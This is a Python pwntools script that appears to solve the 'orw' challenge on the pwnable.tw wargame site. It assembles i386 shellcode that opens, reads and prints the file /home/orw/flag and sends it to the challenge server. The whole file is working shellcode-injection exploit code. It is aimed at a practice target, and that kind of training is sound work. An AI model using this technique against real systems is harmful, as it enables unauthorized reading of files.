from pwn import *

# r = process("./orw")
r = remote("chall.pwnable.tw", 10001)
context.arch = "i386"

shell = asm("\n".join([
    "push %s" % u32(b"ag\0\0"),
    "push %s" % u32(b"w/fl"),
    "push %s" % u32(b"e/or"),
    "push %s" % u32(b"/hom"),
    "xor edx, edx",
    "xor ecx, ecx",
    "mov ebx, esp",
    "mov eax, 0x05",
    "int 0x80",
    "mov ebx, eax",
    "mov ecx, esi",
    "mov edx, 0x100",
    "mov eax, 0x03",
    "int 0x80",
    "mov ebx, 0x1",
    "mov ecx, esi",
    "mov edx, eax",
    "mov eax, 0x04",
    "int 0x80"
]))

r.recv()
r.sendline(shell)
r.interactive()